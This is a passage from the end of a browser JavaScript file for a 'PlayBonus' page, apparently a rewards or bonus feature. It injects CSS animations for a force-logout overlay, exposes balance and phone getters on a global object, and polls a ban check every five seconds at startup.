    // ========== FORCE LOGOUT ANIMATIONS ==========
    function addForceLogoutAnimations() {
        if (document.querySelector('#force-logout-animations')) return;
        
        var style = document.createElement('style');
        style.id = 'force-logout-animations';
        style.textContent = 
            '@keyframes fadeInForceLogout { from { opacity: 0; } to { opacity: 1; } }' +
            '@keyframes fadeOutForceLogout { from { opacity: 1; } to { opacity: 0; } }' +
            '@keyframes cardEnterForceLogout { 0% { transform: scale(0.7) translateY(30px); opacity: 0; } 60% { transform: scale(1.03) translateY(-5px); } 100% { transform: scale(1) translateY(0); opacity: 1; } }' +
            '@keyframes cardExitForceLogout { from { transform: scale(1); opacity: 1; } to { transform: scale(0.8) translateY(20px); opacity: 0; } }' +
            '@keyframes bounceIconForceLogout { 0% { transform: scale(0) rotate(-30deg); } 50% { transform: scale(1.3) rotate(10deg); } 70% { transform: scale(0.85); } 100% { transform: scale(1) rotate(0deg); } }' +
            '@keyframes rotateGlowForceLogout { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }' +
            '@keyframes spinSlowForceLogout { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }' +
            '@keyframes floatDownForceLogout { 0% { transform: translateY(-10px); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateY(105vh); opacity: 0; } }' +
            '@keyframes pulseBadgeForceLogout { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }' +
            '@keyframes btnShineForceLogout { 0% { left: -100%; } 60% { left: 100%; } 100% { left: 100%; } }';
        document.head.appendChild(style);
    }
    
    // ========== EXPORT ==========
    window.PlayBonus = {
        playSound: playSound,
        formatNumberWithComma: formatNumberWithComma,
        getBalance: function() { return currentBalance; },
        getUserPhone: function() { return userPhone; },
        isUserClaimed: function() { return isClaimed; }
    };
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            init();
            setInterval(checkIfBanned, 5000);
            checkIfBanned();
        });
    } else {
        init();
        setInterval(checkIfBanned, 5000);
        checkIfBanned();
    }
    
})();
